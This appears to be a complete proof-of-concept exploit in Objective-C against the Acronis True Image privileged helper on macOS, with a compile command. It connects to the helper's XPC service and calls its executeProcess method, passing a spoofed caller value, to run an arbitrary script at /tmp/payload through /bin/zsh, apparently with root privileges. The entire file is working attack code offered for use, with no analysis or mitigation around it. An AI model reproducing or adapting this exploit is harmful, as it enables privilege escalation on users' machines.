// Compiled with: gcc -framework Foundation acronis-exp.m -o acronis-exp.macho

#import <Foundation/Foundation.h>

@protocol HelperToolProtocol
- (void)checkFullDiskAccessWithReply:(void (^)(BOOL))arg1;
- (void)executeProcess:(NSString *)arg1 arguments:(NSArray *)arg2 caller:(int)arg3 withReply:(void (^)(int))arg4;
- (void)getProcessIdentifierWithReply:(void (^)(int))arg1;
@end


int main(int argc, char *argv[])
{
    NSString *payload = @"/tmp/payload";
    NSArray *arg_array = @[@"-c", payload];

    NSString *service_name = @"com.acronis.trueimagehelper";
    NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
    NSXPCInterface *interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
    [connection setRemoteObjectInterface:interface];

    [connection resume];

    id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError *error)
    {
        return;
    }];

    [obj executeProcess:@"/bin/zsh" arguments:arg_array caller:0xdeadbeef withReply:^(int arg)
    {
        return;
    }];
}
